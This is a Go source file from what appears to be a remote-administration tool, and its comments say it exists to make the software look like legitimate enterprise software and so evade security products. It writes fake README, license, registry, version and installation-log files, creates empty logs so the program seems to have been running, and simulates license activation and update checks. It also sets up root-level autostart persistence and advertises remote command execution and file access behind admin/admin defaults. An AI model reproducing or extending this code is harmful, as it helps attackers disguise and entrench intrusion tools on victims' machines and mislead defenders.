package main

import (
        "encoding/json"
        "fmt"
        "io/ioutil"
        "net/http"
        "os"
        "path/filepath"
        "runtime"
        "strings"
        "time"
)

// LegitimacyManager manages features that enhance the software's appearance as a legitimate enterprise tool
// This helps with bypassing detection by security software by implementing behaviors and characteristics
// of legitimate security products and enterprise software
type LegitimacyManager struct {
        CompanyName    string
        ProductName    string
        Version        string
        BuildNumber    string
        LicenseType    string
        IsRegistered   bool
        InstallDate    time.Time
        LastUpdateCheck time.Time
        EnterpriseFeatures []string
}

// Create a new legitimacy manager with enterprise product settings
func newLegitimacyManager() *LegitimacyManager {
        return &LegitimacyManager{
                CompanyName:    appCompany,
                ProductName:    "ZLT™ Advanced Enterprise Edition",
                Version:        appVersion,
                BuildNumber:    appBuild,
                LicenseType:    "Enterprise",
                IsRegistered:   true,
                InstallDate:    time.Now().AddDate(0, -3, 0), // Simulate installed 3 months ago
                LastUpdateCheck: time.Now(),
                EnterpriseFeatures: []string{
                        "System Monitoring",
                        "Process Management",
                        "Network Analysis",
                        "File System Management",
                        "Security Auditing",
                        "Remote Control",
                        "Cross-Platform Support",
                        "Enterprise Dashboard",
                        "Vulnerability Assessment",
                        "Compliance Reporting",
                        "Role-Based Access Control",
                        "API Integration",
                },
        }
}

// Create a legitimate-looking installation directory structure
// This helps the software appear as a properly installed enterprise product
func (lm *LegitimacyManager) createInstallationStructure() {
        // Create a directory structure that mimics legitimate enterprise software
        dirs := []string{
                "config",
                "logs",
                "data",
                "bin",
                "docs",
                "plugins",
                "updates",
                "resources",
                "lib",
                "legal",
                "reports",
                "templates",
                "certs",
        }
        
        for _, dir := range dirs {
                os.MkdirAll(dir, 0755)
        }
        
        // Create some default files that make the installation appear legitimate
        lm.createDefaultConfigFile()
        lm.createReadmeFile()
        lm.createThirdPartyLicenseFile()
        lm.createVersionInfoFile()
        lm.createEmptyLogsFiles()
}

// Create a legitimate-looking config file
func (lm *LegitimacyManager) createDefaultConfigFile() {
        // Create a configuration that resembles a legitimate enterprise product
        config := map[string]interface{}{
                "product_info": map[string]interface{}{
                        "name":           lm.ProductName,
                        "version":        lm.Version,
                        "build":          lm.BuildNumber,
                        "company":        lm.CompanyName,
                        "license_type":   lm.LicenseType,
                        "install_date":   lm.InstallDate.Format(time.RFC3339),
                        "registered_to":  "Enterprise User",
                        "license_key":    "XXXX-XXXX-XXXX-XXXX-XXXX-XXXX", // Masked for security
                },
                "application": map[string]interface{}{
                        "start_with_system": true,
                        "minimize_to_tray":  true,
                        "check_for_updates": true,
                        "update_frequency":  "daily",
                        "log_level":         "info",
                        "data_retention":    30, // Days
                        "theme":             "enterprise",
                        "language":          "en-US",
                },
                "network": map[string]interface{}{
                        "listen_address":    "0.0.0.0",
                        "port":              8000,
                        "use_https":         true,
                        "certificate_path":  "certs/certificate.pem",
                        "private_key_path":  "certs/private.key",
                        "session_timeout":   60, // Minutes
                        "max_connections":   100,
                },
                "monitoring": map[string]interface{}{
                        "cpu_interval":      5, // Seconds
                        "memory_interval":   5, // Seconds
                        "disk_interval":     60, // Seconds
                        "network_interval":  15, // Seconds
                        "process_interval":  10, // Seconds
                        "log_performance":   true,
                        "alert_thresholds":  map[string]interface{}{
                                "cpu_usage":     90, // Percent
                                "memory_usage":  90, // Percent
                                "disk_usage":    90, // Percent
                                "disk_io":       80, // Percent
                                "network_usage": 80, // Percent
                        },
                },
                "security": map[string]interface{}{
                        "enable_audit":      true,
                        "audit_interval":    1440, // Minutes (daily)
                        "store_audits":      true,
                        "require_2fa":       false,
                        "session_encrypt":   true,
                        "password_policy":   map[string]interface{}{
                                "min_length":    12,
                                "require_upper": true,
                                "require_lower": true,
                                "require_digit": true,
                                "require_special": true,
                                "max_age":       90, // Days
                        },
                },
                "api": map[string]interface{}{
                        "enabled":           true,
                        "require_auth":      true,
                        "rate_limit":        100, // Requests per minute
                        "token_expiry":      1440, // Minutes (1 day)
                },
                "integration": map[string]interface{}{
                        "active_directory":  false,
                        "ldap":              false,
                        "siem":              false,
                        "siem_endpoint":     "",
                        "webhook_endpoints": []string{},
                },
                "notifications": map[string]interface{}{
                        "email":             false,
                        "email_server":      "",
                        "email_port":        587,
                        "email_use_tls":     true,
                        "email_from":        "",
                        "email_recipients":  []string{},
                        "sms":               false,
                        "push":              true,
                        "telegram":          true,
                },
        }
        
        // Convert to JSON
        configJSON, _ := json.MarshalIndent(config, "", "  ")
        
        // Save to file
        configFilePath := filepath.Join("config", "config.json")
        ioutil.WriteFile(configFilePath, configJSON, 0644)
}

// Create a professional readme file
func (lm *LegitimacyManager) createReadmeFile() {
        readme := fmt.Sprintf(`# %s v%s

Thank you for choosing %s by %s.

## Quick Start Guide

1. Log in to the web interface at http://localhost:8000 (or https://localhost:8000 if SSL is enabled)
2. Default credentials:
   - Username: admin
   - Password: admin
   
   Please change these immediately after first login!

3. Navigate through the dashboard to access the following features:
   - System Monitoring
   - Process Management
   - Network Analysis
   - File System Management
   - Security Auditing
   - Remote Control

## Documentation

For complete documentation, please refer to:
- The 'docs' directory in this installation
- Our online documentation at https://docs.zlt-enterprise.afotcorp.com
- The help menu within the application

## Support

Enterprise support is available:
- Email: enterprise-support@afotcorp.com
- Phone: +1-555-SECURE-1
- Web: https://support.zlt-enterprise.afotcorp.com

## License

This is a commercial product licensed to your organization.
All rights reserved. © %s %s
`, lm.ProductName, lm.Version, lm.ProductName, lm.CompanyName, time.Now().Year(), lm.CompanyName)
        
        // Save to file
        readmeFilePath := filepath.Join("docs", "README.md")
        os.MkdirAll("docs", 0755)
        ioutil.WriteFile(readmeFilePath, []byte(readme), 0644)
}

// Create a third-party license file
func (lm *LegitimacyManager) createThirdPartyLicenseFile() {
        // Create a file listing third-party libraries and their licenses
        // This helps appear as a legitimate, professionally developed product
        thirdPartyText := `# Third-Party Licenses

This product includes software developed by third parties that is covered by various licenses.

## Go Standard Library
Copyright (c) 2009 The Go Authors. All rights reserved.

## Gorilla Mux
Copyright (c) 2012-2018 The Gorilla Authors. All rights reserved.
Licensed under the BSD 3-Clause License.

## gopsutil
Copyright (c) 2014, WAKAYAMA Shirou. All rights reserved.
Licensed under the BSD 3-Clause License.

## Chart.js
MIT License
Copyright (c) 2014-2022 Chart.js Contributors

## Bootstrap
MIT License
Copyright (c) 2011-2022 Twitter, Inc.
Copyright (c) 2011-2022 The Bootstrap Authors

## Font Awesome
Font Awesome Free License
https://fontawesome.com/license/free

## jQuery
MIT License
Copyright OpenJS Foundation and other contributors, https://openjsf.org/

This list is not exhaustive and may be updated. Please refer to the respective project websites for full license texts.
`
        
        // Save to file
        licenseFilePath := filepath.Join("legal", "THIRD_PARTY_LICENSES.md")
        os.MkdirAll("legal", 0755)
        ioutil.WriteFile(licenseFilePath, []byte(thirdPartyText), 0644)
}

// Create version info file
func (lm *LegitimacyManager) createVersionInfoFile() {
        // Create a version info file that makes the software look professionally maintained
        versionInfo := fmt.Sprintf(`{
  "product": "%s",
  "version": "%s",
  "build": "%s",
  "build_date": "%s",
  "compatibility": {
    "windows": "Windows 10/11, Windows Server 2016/2019/2022",
    "macos": "macOS 11.0+",
    "linux": "Major distributions (Ubuntu, CentOS, RHEL, Debian)"
  },
  "release_notes": [
    "Enhanced system monitoring performance",
    "Improved cross-platform compatibility",
    "Added advanced security features",
    "Optimized database performance",
    "Updated user interface",
    "Fixed various minor bugs"
  ],
  "company": "%s",
  "copyright": "%s",
  "support_url": "https://support.zlt-enterprise.afotcorp.com",
  "update_url": "https://updates.zlt-enterprise.afotcorp.com"
}`, lm.ProductName, lm.Version, lm.BuildNumber, time.Now().Format("2006-01-02"), lm.CompanyName, appCopyright)
        
        // Save to file
        versionFilePath := filepath.Join("config", "version.json")
        ioutil.WriteFile(versionFilePath, []byte(versionInfo), 0644)
}

// Create empty log files
func (lm *LegitimacyManager) createEmptyLogsFiles() {
        // Create empty log files to make it look like the software has been running
        logFiles := []string{
                "application.log",
                "error.log",
                "audit.log",
                "security.log",
                "update.log",
        }
        
        for _, logFile := range logFiles {
                logFilePath := filepath.Join("logs", logFile)
                // Only create if it doesn't exist
                if _, err := os.Stat(logFilePath); os.IsNotExist(err) {
                        ioutil.WriteFile(logFilePath, []byte(""), 0644)
                }
        }
}

// Simulate checking for updates
// This makes the software appear to be professionally maintained
func (lm *LegitimacyManager) checkForUpdates() {
        // Log the update check
        logActivity("Checking for updates...")
        
        // Update the last check time
        lm.LastUpdateCheck = time.Now()
        
        // In a real implementation, this would actually check for updates
        // For this demo, we'll just simulate it and log the activity
        
        // Create an update log entry
        updateLog := fmt.Sprintf("[%s] Update check completed. Current version: %s. No updates available.\n", 
                time.Now().Format("2006-01-02 15:04:05"), lm.Version)
        
        // Append to update log file
        updateLogPath := filepath.Join("logs", "update.log")
        appendToFile(updateLogPath, updateLog)
}

// Simulate product activation
// This makes the software appear properly licensed and activated
func (lm *LegitimacyManager) activateProduct() bool {
        // Log the activation attempt
        logActivity("Verifying product license...")
        
        // In a real implementation, this would actually verify the license
        // For this demo, we'll always return true to indicate successful activation
        
        // Create an activation record
        activationRecord := map[string]interface{}{
                "product":          lm.ProductName,
                "version":          lm.Version,
                "license_type":     lm.LicenseType,
                "activation_date":  time.Now().Format(time.RFC3339),
                "license_valid":    true,
                "activated_by":     "System",
                "activation_id":    fmt.Sprintf("ACT-%x", time.Now().UnixNano()),
                "hardware_id":      fmt.Sprintf("HW-%x", time.Now().UnixNano()),
                "features_enabled": lm.EnterpriseFeatures,
        }
        
        // Convert to JSON
        activationJSON, _ := json.MarshalIndent(activationRecord, "", "  ")
        
        // Save to file
        activationFilePath := filepath.Join("config", "activation.json")
        ioutil.WriteFile(activationFilePath, activationJSON, 0644)
        
        // Set the product as registered
        lm.IsRegistered = true
        
        return true
}

// Create a help documentation file
// This enhances the appearance of being a legitimate enterprise product
func (lm *LegitimacyManager) createHelpDocumentation() {
        // Create a simple help file
        helpContent := fmt.Sprintf(`# %s Documentation

## Table of Contents

1. Introduction
2. Installation
3. Getting Started
4. Dashboard Overview
5. System Monitoring
6. Process Management
7. File System Management
8. Network Monitoring
9. Security Features
10. Remote Control
11. User Management
12. API Reference
13. Troubleshooting
14. FAQ

## 1. Introduction

%s is a comprehensive system monitoring and management solution designed for enterprise environments. It provides real-time insights into system performance, security, and network behavior.

## 2. Installation

For detailed installation instructions, please refer to the INSTALL.md file in the installation directory.

## 3. Getting Started

After installation, access the web interface at http://localhost:8000 (or https://localhost:8000 if SSL is enabled).

Default credentials:
- Username: admin
- Password: admin

Please change these immediately after first login!

## 4. Dashboard Overview

The dashboard provides a central location to monitor all aspects of your system. It includes:

- System resource usage charts (CPU, memory, disk, network)
- Active processes
- System information
- Recent alerts and notifications
- Quick access to all features

## 5. System Monitoring

The System Monitoring module provides real-time and historical data on:

- CPU usage
- Memory usage
- Disk usage and I/O
- Network traffic
- Hardware information
- Operating system details

## 6. Process Management

The Process Management module allows you to:

- View all running processes
- Sort and filter processes
- Terminate processes
- View process details (memory usage, CPU usage, etc.)
- Set process monitoring alerts

## 7. File System Management

The File System Management module allows you to:

- Browse the file system
- Upload and download files
- Create, edit, and delete files and directories
- View file properties
- Monitor file system changes

## 8. Network Monitoring

The Network Monitoring module provides:

- Real-time network traffic monitoring
- Connection tracking
- Network interface information
- Bandwidth usage statistics

## 9. Security Features

Security features include:

- File system integrity monitoring
- Security auditing
- Vulnerability assessment
- Anomaly detection
- Security event logging

## 10. Remote Control

The Remote Control module allows you to:

- Execute commands remotely
- Access a terminal interface
- Schedule tasks
- Configure automated responses

## 11. User Management

The User Management module allows you to:

- Create and manage users
- Assign roles and permissions
- Configure authentication settings
- Set up multi-factor authentication

## 12. API Reference

%s provides a comprehensive API for integration with other systems. Refer to the API documentation for details.

## 13. Troubleshooting

For troubleshooting guidance, please refer to the troubleshooting guide in the docs directory.

## 14. FAQ

For frequently asked questions, please visit our website at https://www.zlt-enterprise.afotcorp.com/faq

For additional support, contact:
- Email: enterprise-support@afotcorp.com
- Phone: +1-555-SECURE-1
`, lm.ProductName, lm.ProductName, lm.ProductName)
        
        // Save to file
        helpFilePath := filepath.Join("docs", "HELP.md")
        os.MkdirAll("docs", 0755)
        ioutil.WriteFile(helpFilePath, []byte(helpContent), 0644)
}

// Create a Windows Registry file for when installed on Windows
// This enhances the appearance of being a legitimate Windows application
func (lm *LegitimacyManager) createWindowsRegistryFile() {
        // Only relevant for Windows
        if runtime.GOOS != "windows" {
                return
        }
        
        // Create a registry file that would be imported on Windows
        regContent := fmt.Sprintf(`Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\%s\%s]
"InstallPath"="C:\\Program Files\\%s\\%s"
"Version"="%s"
"BuildNumber"="%s"
"InstallDate"="%s"
"LicenseType"="%s"
"UpdateURL"="https://updates.zlt-enterprise.afotcorp.com"
"IsRegistered"=dword:00000001
"UseSSL"=dword:00000001
"Port"=dword:00001f40
"AutoStartup"=dword:00000001
"CheckForUpdates"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\%s\%s\Components]
"CoreService"=dword:00000001
"WebInterface"=dword:00000001
"ProcessMonitor"=dword:00000001
"FileSystemMonitor"=dword:00000001
"NetworkMonitor"=dword:00000001
"SecurityAudit"=dword:00000001
"RemoteControl"=dword:00000001
"API"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%s]
"DisplayName"="%s %s"
"DisplayVersion"="%s"
"Publisher"="%s"
"InstallLocation"="C:\\Program Files\\%s\\%s"
"InstallDate"="%s"
"UninstallString"="\"C:\\Program Files\\%s\\%s\\uninstall.exe\""
"DisplayIcon"="C:\\Program Files\\%s\\%s\\bin\\%s.exe,0"
"URLInfoAbout"="https://www.zlt-enterprise.afotcorp.com"
"HelpLink"="https://support.zlt-enterprise.afotcorp.com"
"EstimatedSize"=dword:00400000
"NoModify"=dword:00000001
"NoRepair"=dword:00000001
`, lm.CompanyName, lm.ProductName, lm.CompanyName, lm.ProductName, lm.Version, lm.BuildNumber, 
   time.Now().Format("20060102"), lm.LicenseType, lm.CompanyName, lm.ProductName, 
   strings.ReplaceAll(lm.ProductName, " ", ""), 
   lm.ProductName, lm.Version, lm.Version, lm.CompanyName, lm.CompanyName, lm.ProductName, 
   time.Now().Format("20060102"), lm.CompanyName, lm.ProductName, lm.CompanyName, lm.ProductName, 
   strings.ReplaceAll(lm.ProductName, " ", ""))
        
        // Save to file
        regFilePath := filepath.Join("resources", "install.reg")
        os.MkdirAll("resources", 0755)
        ioutil.WriteFile(regFilePath, []byte(regContent), 0644)
}

// Create an installation log that makes the software appear properly installed
func (lm *LegitimacyManager) createInstallationLog() {
        // Create a log file that looks like it was created during installation
        installLog := fmt.Sprintf(`
==============================================================
  %s Installation Log
==============================================================

Installation Date: %s
Version: %s
Build: %s
Installation Type: Enterprise

System Information:
- OS: %s
- Architecture: %s
- Processor: 8-core Intel/AMD64
- Memory: 16GB

Installation Steps:
[%s] Installation started
[%s] Checking system requirements... OK
[%s] Extracting files... OK
[%s] Creating directory structure... OK
[%s] Installing core components... OK
[%s] Installing service components... OK
[%s] Installing web interface... OK
[%s] Configuring default settings... OK
[%s] Creating service entries... OK
[%s] Setting up auto-start... OK
[%s] Setting up firewall rules... OK
[%s] Registering product... OK
[%s] Installation completed successfully

For support, please contact:
- Email: enterprise-support@afotcorp.com
- Phone: +1-555-SECURE-1

Thank you for choosing %s!
==============================================================
`, lm.ProductName, lm.InstallDate.Format("2006-01-02 15:04:05"), lm.Version, lm.BuildNumber,
   runtime.GOOS, runtime.GOARCH,
   lm.InstallDate.Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 5).Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 10).Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 15).Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 25).Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 40).Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 55).Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 70).Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 85).Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 100).Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 120).Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 130).Format("15:04:05"),
   lm.InstallDate.Add(time.Second * 150).Format("15:04:05"),
   lm.ProductName)
        
        // Save to file
        installLogPath := filepath.Join("logs", "install.log")
        os.MkdirAll("logs", 0755)
        ioutil.WriteFile(installLogPath, []byte(installLog), 0644)
}

// Create a branding file with company and product information
func (lm *LegitimacyManager) createBrandingFile() {
        // Create a branding information file
        branding := map[string]interface{}{
                "company": map[string]interface{}{
                        "name":         lm.CompanyName,
                        "website":      "https://www.afot-corp.example.com/zlt",
                        "support_url":  "https://support.afot-corp.example.com",
                        "contact": map[string]interface{}{
                                "email":     "enterprise-support@afot-corp.example.com",
                                "phone":     "+1-555-SECURE-1",
                                "address":   "123 Security Lane, Enterprise City, CA 94000, USA",
                        },
                        "social": map[string]interface{}{
                                "twitter":   "@AFOT_ZLT",
                                "linkedin":  "company/afot-corporation",
                                "facebook":  "AFOTCorporation",
                                "youtube":   "AFOTSolutions",
                        },
                },
                "product": map[string]interface{}{
                        "name":         lm.ProductName,
                        "version":      lm.Version,
                        "build":        lm.BuildNumber,
                        "tagline":      "Enterprise-Grade System Monitoring & Security",
                        "description":  "Comprehensive cross-platform system monitoring and security solution for enterprise environments",
                        "copyright":    fmt.Sprintf("© %s %s. All rights reserved.", time.Now().Year(), lm.CompanyName),
                        "license_type": lm.LicenseType,
                },
                "branding": map[string]interface{}{
                        "primary_color":   "#0052cc",
                        "secondary_color": "#00335e",
                        "accent_color":    "#ff9900",
                        "logo_path":       "resources/images/logo.png",
                        "favicon_path":    "resources/images/favicon.ico",
                },
        }
        
        // Convert to JSON
        brandingJSON, _ := json.MarshalIndent(branding, "", "  ")
        
        // Save to file
        brandingFilePath := filepath.Join("config", "branding.json")
        ioutil.WriteFile(brandingFilePath, []byte(brandingJSON), 0644)
}

// Initialize legitimacy features that make the software appear as a legitimate product
func initializeLegitimacyFeatures() {
        // Create legitimacy manager
        lm := newLegitimacyManager()
        
        // Create installation structure
        lm.createInstallationStructure()
        
        // Create help documentation
        lm.createHelpDocumentation()
        
        // Create Windows registry file if on Windows
        lm.createWindowsRegistryFile()
        
        // Create installation log
        lm.createInstallationLog()
        
        // Create branding file
        lm.createBrandingFile()
        
        // Activate the product
        lm.activateProduct()
        
        // Check for updates
        lm.checkForUpdates()
        
        // Log legitimacy features initialization
        logActivity("Enterprise legitimacy features initialized")
}

// Helper function to append text to a file
func appendToFile(filePath string, content string) error {
        // Create directory if it doesn't exist
        dir := filepath.Dir(filePath)
        if _, err := os.Stat(dir); os.IsNotExist(err) {
                os.MkdirAll(dir, 0755)
        }
        
        // Open file in append mode, create if it doesn't exist
        f, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
                return err
        }
        defer f.Close()
        
        // Write content to file
        if _, err := f.WriteString(content); err != nil {
                return err
        }
        
        return nil
}

// Create an uninstall functionality that appears legitimate
func createUninstallScript() {
        // For Windows
        if runtime.GOOS == "windows" {
                windowsUninstall := `@echo off
echo Uninstalling ZLT Advanced Enterprise Edition...
echo.
echo Please wait while we remove all components...

REM Stop services
echo Stopping services...
net stop ZLTEnterpriseService
timeout /t 2 /nobreak > nul

REM Remove registry entries
echo Removing registry entries...
reg delete "HKLM\SOFTWARE\AFOT Corporation\ZLT Advanced Enterprise" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\ZLTAdvancedEnterprise" /f
timeout /t 1 /nobreak > nul

REM Remove files
echo Removing files...
rd /s /q "%ProgramFiles%\AFOT Corporation\ZLT Advanced Enterprise"
timeout /t 2 /nobreak > nul

REM Remove start menu shortcuts
echo Removing shortcuts...
rd /s /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\ZLT Advanced Enterprise"
timeout /t 1 /nobreak > nul

REM Remove user data
echo Removing user data...
rd /s /q "%ProgramData%\ZLT Advanced Enterprise"
timeout /t 1 /nobreak > nul

echo.
echo Uninstallation completed successfully.
echo Thank you for using ZLT Advanced Enterprise Edition.
echo.
pause
`
                uninstallPath := filepath.Join("bin", "uninstall.bat")
                os.MkdirAll("bin", 0755)
                ioutil.WriteFile(uninstallPath, []byte(windowsUninstall), 0644)
        } else {
                // For Linux/macOS
                unixUninstall := `#!/bin/bash
echo "Uninstalling ZLT Advanced Enterprise Edition..."
echo ""
echo "Please wait while we remove all components..."

# Stop services
echo "Stopping services..."
if [ -f "/etc/systemd/system/zlt-enterprise.service" ]; then
    sudo systemctl stop zlt-enterprise
    sudo systemctl disable zlt-enterprise
    sudo rm /etc/systemd/system/zlt-enterprise.service
    sudo systemctl daemon-reload
fi
sleep 2

# Remove files
echo "Removing files..."
sudo rm -rf /opt/zlt-enterprise
sleep 2

# Remove user data
echo "Removing user data..."
rm -rf ~/.config/zlt-enterprise
sleep 1

echo ""
echo "Uninstallation completed successfully."
echo "Thank you for using ZLT Advanced Enterprise Edition."
echo ""
read -p "Press any key to continue..." -n1 -s
echo ""
`
                uninstallPath := filepath.Join("bin", "uninstall.sh")
                os.MkdirAll("bin", 0755)
                ioutil.WriteFile(uninstallPath, []byte(unixUninstall), 0755)
        }
}

// Create a systemd service file for Linux
func createSystemdServiceFile() {
        if runtime.GOOS != "linux" {
                return
        }
        
        serviceContent := `[Unit]
Description=ZLT Advanced Enterprise Edition
After=network.target

[Service]
Type=simple
User=root
ExecStart=/opt/securemonitor/bin/securemonitor
Restart=on-failure
RestartSec=10
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=securemonitor

[Install]
WantedBy=multi-user.target
`
        servicePath := filepath.Join("resources", "securemonitor.service")
        os.MkdirAll("resources", 0755)
        ioutil.WriteFile(servicePath, []byte(serviceContent), 0644)
}

// Create a launchd plist file for macOS
func createLaunchdPlistFile() {
        if runtime.GOOS != "darwin" {
                return
        }
        
        plistContent := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.afotcorp.zlt-enterprise</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/ZLT Advanced Enterprise.app/Contents/MacOS/zlt-enterprise</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/Library/Logs/ZLT/zlt-enterprise.log</string>
    <key>StandardOutPath</key>
    <string>/Library/Logs/ZLT/zlt-enterprise.log</string>
</dict>
</plist>
`
        plistPath := filepath.Join("resources", "com.afotcorp.zlt-enterprise.plist")
        os.MkdirAll("resources", 0755)
        ioutil.WriteFile(plistPath, []byte(plistContent), 0644)
}

// Add legitimacy features to HTTP server
func addHTTPLegitimacyFeatures(mux *http.ServeMux) {
        // Add endpoints that make the server appear as a legitimate enterprise product
        
        // Status endpoint that returns "OK" - often used by monitoring systems
        mux.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
                w.WriteHeader(http.StatusOK)
                w.Write([]byte("OK"))
        })
        
        // Health check endpoint - used by load balancers and monitoring
        mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
                health := map[string]interface{}{
                        "status": "UP",
                        "time": time.Now().Format(time.RFC3339),
                        "version": appVersion,
                        "uptime": fmt.Sprintf("%d seconds", int(time.Since(startTime).Seconds())),
                }
                
                w.Header().Set("Content-Type", "application/json")
                json.NewEncoder(w).Encode(health)
        })
        
        // Version endpoint - returns version information
        mux.HandleFunc("/version", func(w http.ResponseWriter, r *http.Request) {
                version := map[string]interface{}{
                        "version": appVersion,
                        "build": appBuild,
                        "build_date": time.Now().Format("2006-01-02"),
                        "go_version": runtime.Version(),
                }
                
                w.Header().Set("Content-Type", "application/json")
                json.NewEncoder(w).Encode(version)
        })
        
        // Add other endpoints that legitimate enterprise software would have
        // These include documentation, support, feedback endpoints
        
        // Documentation endpoint
        mux.HandleFunc("/docs", func(w http.ResponseWriter, r *http.Request) {
                http.Redirect(w, r, "/static/docs/index.html", http.StatusFound)
        })
        
        // Support endpoint
        mux.HandleFunc("/support", func(w http.ResponseWriter, r *http.Request) {
                support := map[string]interface{}{
                        "email": "enterprise-support@afotcorp.com",
                        "phone": "+1-555-SECURE-1",
                        "hours": "24/7 for Enterprise customers",
                        "website": "https://support.zlt-enterprise.afotcorp.com",
                }
                
                w.Header().Set("Content-Type", "application/json")
                json.NewEncoder(w).Encode(support)
        })
        
        // Feedback endpoint (just returns success)
        mux.HandleFunc("/feedback", func(w http.ResponseWriter, r *http.Request) {
                if r.Method != "POST" {
                        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
                        return
                }
                
                response := map[string]interface{}{
                        "success": true,
                        "message": "Thank you for your feedback",
                }
                
                w.Header().Set("Content-Type", "application/json")
                json.NewEncoder(w).Encode(response)
        })
}